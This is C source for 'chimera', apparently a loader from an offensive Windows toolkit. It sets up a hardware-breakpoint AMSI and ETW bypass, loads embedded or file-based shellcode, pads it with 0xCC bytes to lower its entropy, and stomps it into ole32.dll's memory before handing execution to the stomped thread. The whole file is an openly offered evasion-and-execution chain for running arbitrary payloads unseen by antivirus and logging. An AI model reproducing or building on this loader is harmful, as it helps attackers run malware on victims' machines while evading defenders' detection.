// MDK
// docs    : https://sebafvs.com/mdk/loaders/chimera
// author  : @sebafvs

#include <windows.h>
#include <string.h>

#include "mdk/dbg.h"
#include "mdk/result.h"
#include "mdk/memory.h"
#include "mdk/execution.h"
#include "mdk/payload.h"

#include "common.h"
#include "payload.h"


#ifndef PRIMARY_DLL
#define PRIMARY_DLL       L"C:\\Windows\\System32\\ole32.dll"
#endif
#ifndef ENTROPY_PAD_SIZE
#define ENTROPY_PAD_SIZE  4096
#endif


static int run_payload(void) {
    DBG_INFO("chimera: HWBP-based AMSI + ETW bypass & Module Stomping");
    DBG_INFO("primary DLL: %ls", PRIMARY_DLL);
    DBG_INFO("pid=%lu tid=%lu", GetCurrentProcessId(), GetCurrentThreadId());

    MDK_RESULT r = mdk_loader_setup_bypasses();
    if (MDK_FAIL(r)) { return -1; }

    DBG_STAGE(7, "Load payload");
    BYTE*  payload      = NULL;
    SIZE_T payload_size = 0;
    r = mdk_loader_payload(mdk_loader_shellcode_path(), g_payload, sizeof(g_payload), &payload, &payload_size);
    if (MDK_FAIL(r)) {
        DBG_ERR("mdk_loader_payload failed: op=%s nt=0x%08lX gle=%lu", r.operation, (unsigned long)r.nt_status, r.win32_error);
        return -1;
    }
    DBG_OK("payload loaded: source=%s addr=%p size=%lu", mdk_loader_shellcode_path() ? mdk_loader_shellcode_path() : "<embedded>", (PVOID)payload, (unsigned long)payload_size);

    DBG_STAGE(8, "Entropy pad");
    BYTE*  padded      = NULL;
    SIZE_T padded_size = 0;
    r = mdk_entropy_pad(payload, payload_size, 0xCC, ENTROPY_PAD_SIZE, &padded, &padded_size);
    SecureZeroMemory(payload, payload_size);
    HeapFree(GetProcessHeap(), 0, payload);
    if (MDK_FAIL(r)) {
        DBG_ERR("mdk_entropy_pad failed: op=%s nt=0x%08lX gle=%lu", r.operation, (unsigned long)r.nt_status, r.win32_error);
        return -1;
    }
    DBG_OK("padded: addr=%p size=%lu (payload + %d pad, filler=0xCC)", (PVOID)padded, (unsigned long)padded_size, ENTROPY_PAD_SIZE);

    DBG_STAGE(9, "Module stomp");
    DBG_INFO("target DLL: %ls", PRIMARY_DLL);
    HANDLE stomped_thread = NULL;
    r = mdk_module_stomp(padded, padded_size, PRIMARY_DLL, &stomped_thread);

    memset(padded, 0, padded_size);
    HeapFree(GetProcessHeap(), 0, padded);

    if (MDK_FAIL(r) || stomped_thread == NULL) {
        DBG_ERR("mdk_module_stomp failed: %ls op=%s nt=0x%08lX", PRIMARY_DLL, r.operation, (unsigned long)r.nt_status);
        return -1;
    }
    DBG_OK("stomped: %ls", PRIMARY_DLL);
    DBG_OK("stomped-thread handle: %p", (PVOID)stomped_thread);

    DBG_STAGE(10, "Hand off to stomped thread and exit main thread");
    DBG_INFO("closing stomped-thread handle, calling ExitThread(0)");
    CloseHandle(stomped_thread);
    ExitThread(0);
    return 0;
}


int main(int argc, char *argv[]) {
    return mdk_loader_start(argc, argv, run_payload);
}
